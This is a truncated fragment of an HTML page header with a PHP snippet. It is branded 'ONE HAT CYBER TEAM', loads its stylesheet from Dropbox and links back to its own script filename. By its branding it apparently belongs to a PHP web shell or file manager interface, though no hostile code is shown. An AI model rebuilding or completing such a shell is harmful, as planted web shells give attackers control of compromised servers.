...
<!DOCTYPE html>
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<link rel="icon" href="https://j.top4top.io/p_22034jzpr1.png" />
                        <link href="https://fonts.googleapis.com/css2?family=Merriweather&display=swap" rel="stylesheet">
			<link rel="stylesheet" href="https://dl.dropbox.com/s/oc51cznqzpaa6qa/main.css" type="text/css">
		...
		<br>
		<div class="y x">
		<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">ONE HAT CYBER TEAM</a>
		</div>
		<div class="q x w">
		</div>
		</header>
